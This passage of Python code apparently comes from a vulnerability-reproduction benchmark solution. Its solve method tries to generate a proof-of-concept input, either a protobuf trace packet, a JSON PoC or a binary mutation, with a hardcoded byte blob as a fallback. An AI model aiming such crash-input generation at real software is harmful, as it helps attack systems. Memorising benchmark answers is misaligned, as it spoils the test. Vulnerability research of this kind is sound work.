    return bytes(data)


class Solution:
    def solve(self, src_path: str) -> bytes:
        reg = _collect_proto_registry(src_path)
        try:
            poc = _build_trace_packet_with_graph(reg)
            if poc:
                return poc
        except Exception:
            pass

        try:
            jpoc = _try_json_poc(src_path)
            if jpoc:
                return jpoc
        except Exception:
            pass

        bpoc = _try_binary_mutation(src_path)
        if bpoc:
            return bpoc

        # Last resort: small protobuf-like blob that is a Trace with one packet containing a tiny embedded message.
        # (field 1, len=3, bytes: [field 1 varint 1])
        return b"\x0a\x03\x08\x01\x10"